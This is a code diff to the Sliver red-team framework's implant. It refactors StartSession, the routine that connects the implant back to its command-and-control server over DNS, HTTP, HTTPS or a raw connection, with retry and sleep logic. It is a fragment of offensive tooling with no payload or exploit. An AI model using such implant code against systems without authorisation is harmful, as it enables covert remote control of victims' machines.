@@ -51,25 +51,11 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
 var (
 	readBufSize = 16 * 1024 // 16kb
 )
-
-// Connection - A connection supporting protobuf read-write operations and tunneling
-type Connection interface {
-	RequestRecv() chan *pb.Envelope
-	RequestSend(*pb.Envelope)
-	RequestResend([]byte)
-	Close() error
-
-	// Tunneling
-	Tunnel(ID uint64) *transports.Tunnel
-	AddTunnel(*transports.Tunnel)
-	RemoveTunnel(ID uint64)
-}
 
 // StartSession - Setup a Session RPC either around a provided, physical connection,
 // or directly through C2 channel packages that take care of this.
@@ -77,6 +63,10 @@ func (t *C2) StartSession() (err error) {
 
 	// Maybe move this out of here
 	for t.attempts < int(t.Profile.MaxConnectionErrors) {
+
+		// Always reinstantiate a blank but ready to work Connection
+		t.Connection = transports.NewConnection()
+
 		switch t.uri.Scheme {
 
 		// Some protocols can count on a physical connection already being here.
@@ -85,62 +75,40 @@ func (t *C2) StartSession() (err error) {
 			if t.Conn == nil {
 				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
 			}
-			t.Connection, err = transports.SetupConnectionStream(t.Conn, t.cleanup)
+			err = transports.NewSession(t.Conn, t.Connection)
 			// {{end}}
 
 		// {{if .Config.DNSc2Enabled}}
 		case "dns":
-			t.Connection, err = dnsclient.SetupConnectionDNS(t.uri, t.Profile)
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[dns] Connection failed: %s", err)
-				// {{end}}
-				t.FailedAttempt()
-				continue
-			}
+			err = dnsclient.NewSessionDNS(t.uri, t.Profile, t.Connection)
 			// {{end}}
 
 		// {{if .Config.HTTPc2Enabled}}
 		case "https":
-			t.Connection, err = httpclient.SetupConnectionHTTPS(t.uri, t.Profile, t.cleanup)
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[%s] Connection failed: %s", t.uri.Scheme, err.Error())
-				// {{end}}
-				t.FailedAttempt()
-				continue
-			}
+			err = httpclient.NewSessionHTTPS(t.uri, t.Profile, t.Connection)
+
 		case "http":
-			t.Connection, err = httpclient.SetupConnectionHTTP(t.uri, t.Profile, t.cleanup)
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[%s] Connection failed: %s", t.uri.Scheme, err.Error())
-				// {{end}}
-				t.FailedAttempt()
-				continue
-			}
+			err = httpclient.NewSessionHTTP(t.uri, t.Profile, t.Connection)
 			// {{end}}
+
 		default:
+			return fmt.Errorf("Invalid C2 address sheme: %s", t.uri.Scheme)
+		}
+
+		// Reattempt if any error was thrown when starting/setting up the session layer
+		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("Invalid C2 address sheme: %s", t.uri.Scheme)
+			log.Printf("[%s] Connection failed: %s", t.Profile.C2.String(), err)
 			// {{end}}
+			t.FailedAttempt()
+
+			// Wait according to intervals
+			time.Sleep(time.Duration(t.Profile.Interval))
+			continue
 		}
 
-		// If the connection is set (and thus not nil), break and return
-		if t.Connection != nil {
-			break
-		}
-
-		// In case of failure to initiate a session, sleep
-		// for the determined ReconnectInterval. This interval
-		// is shared both at the transport and at the Session layer.
-		time.Sleep(time.Duration(t.Profile.Interval))
-	}
-
-	// The logical connection should never be nil here, and that
-	// means we exhausted the max errors for this transport.
-	if t.Connection == nil {
-		return fmt.Errorf("Failed to set up Session over transport %d (%s)", t.ID, t.uri)
+		// Else return, there are no errors, we have thus a session
+		return
 	}
 
 	return
